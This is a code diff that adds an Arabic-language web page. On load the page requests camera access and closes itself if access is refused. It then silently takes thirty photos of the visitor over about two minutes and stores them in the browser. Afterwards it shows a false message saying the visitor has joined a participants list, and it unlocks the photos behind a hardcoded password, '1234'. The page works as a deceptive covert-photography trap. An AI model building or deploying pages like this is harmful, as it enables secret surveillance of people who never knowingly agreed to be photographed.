@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>صفحة الكاميرا</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            background-color: #f0f8ff;
+            padding-top: 50px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        h1 {
+            color: #4CAF50;
+        }
+
+        .input-container {
+            margin-top: 20px;
+        }
+
+        input[type="password"] {
+            padding: 10px;
+            font-size: 16px;
+            width: 200px;
+            text-align: center;
+            border: 2px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            margin-top: 10px;
+        }
+
+        #message {
+            font-size: 18px;
+            margin-top: 20px;
+            color: green;
+        }
+
+        .images-container {
+            margin-top: 20px;
+        }
+
+        img {
+            width: 200px;
+            height: auto;
+            margin: 10px;
+            border-radius: 10px;
+        }
+
+        .exit-button {
+            background-color: red;
+            margin-top: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>صفحة الكاميرا</h1>
+
+<div id="message" class="hidden"></div>
+
+<div id="passwordSection">
+    <div class="input-container">
+        <input type="password" id="password" placeholder="أدخل الرمز السري" />
+    </div>
+    <button onclick="checkPassword()">تحقق</button>
+</div>
+
+<div id="imagesSection" class="hidden">
+    <h2>الصور الملتقطة</h2>
+    <div id="imageContainer" class="images-container"></div>
+    <button class="exit-button" onclick="exitPage()">الخروج</button>
+</div>
+
+<script>
+    let videoStream;
+    let images = [];
+    let captureCount = 0; // عداد لعدد الصور الملتقطة
+
+    // التحقق من الصور المحفوظة
+    if (localStorage.getItem('images')) {
+        images = JSON.parse(localStorage.getItem('images'));
+    }
+
+    // فتح الكاميرا
+    function startCamera() {
+        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    captureImage(); // التقاط الصورة عند دخول الصفحة
+                })
+                .catch(err => {
+                    alert('تم رفض إذن الوصول إلى الكاميرا، سيتم إغلاق الصفحة.');
+                    window.close(); // إغلاق الصفحة في حال تم رفض إذن الكاميرا
+                });
+        } else {
+            alert('المتصفح لا يدعم الوصول إلى الكاميرا');
+        }
+    }
+
+    // التقاط صورة عند دخول الصفحة
+    function captureImage() {
+        setTimeout(() => {
+            if (captureCount < 30) { // التأكد من أن العدد أقل من 30 صورة
+                const video = document.createElement('video');
+                video.srcObject = videoStream;
+                video.play();
+
+                const canvas = document.createElement('canvas');
+                const context = canvas.getContext('2d');
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    images.push(canvas.toDataURL('image/png'));
+                    captureCount++;
+
+                    saveImages();
+                    captureImage(); // الاستمرار في التقاط الصور
+                }, 1000); // التقاط الصورة بعد ثانية من تشغيل الفيديو
+            } else {
+                stopCamera();
+                showMessageAndImages(); // عرض الرسالة والصور بعد الوصول للحد الأقصى
+            }
+        }, 3000); // بدء التقاط الصورة بعد 3 ثوانٍ من فتح الكاميرا
+    }
+
+    // إيقاف الكاميرا
+    function stopCamera() {
+        const tracks = videoStream.getTracks();
+        tracks.forEach(track => track.stop());
+    }
+
+    // حفظ الصور في Local Storage
+    function saveImages() {
+        localStorage.setItem('images', JSON.stringify(images));
+    }
+
+    // عرض الرسالة والصور بعد التقاط الصور
+    function showMessageAndImages() {
+        document.getElementById('message').textContent = 'لقد دخلت قائمة المشاركين';
+        document.getElementById('message').classList.remove('hidden');
+        document.getElementById('passwordSection').classList.remove('hidden');
+    }
+
+    // التحقق من الرمز السري
+    function checkPassword() {
+        const password = document.getElementById('password').value;
+        if (password === '1234') {
+            document.getElementById('passwordSection').classList.add('hidden');
+            document.getElementById('imagesSection').classList.remove('hidden');
+            showImages();
+        } else {
+            alert('الرمز السري غير صحيح');
+        }
+    }
+
+    // عرض الصور الملتقطة
+    function showImages() {
+        const imageContainer = document.getElementById('imageContainer');
+        images.forEach(imageSrc => {
+            const img = document.createElement('img');
+            img.src = imageSrc;
+            imageContainer.appendChild(img);
+        });
+    }
+
+    // إغلاق الصفحة
+    function exitPage() {
+        window.close();
+    }
+
+    // بدء الكاميرا فور تحميل الصفحة
+    window.onload = startCamera;
+</script>
+
+</body>
+</html>
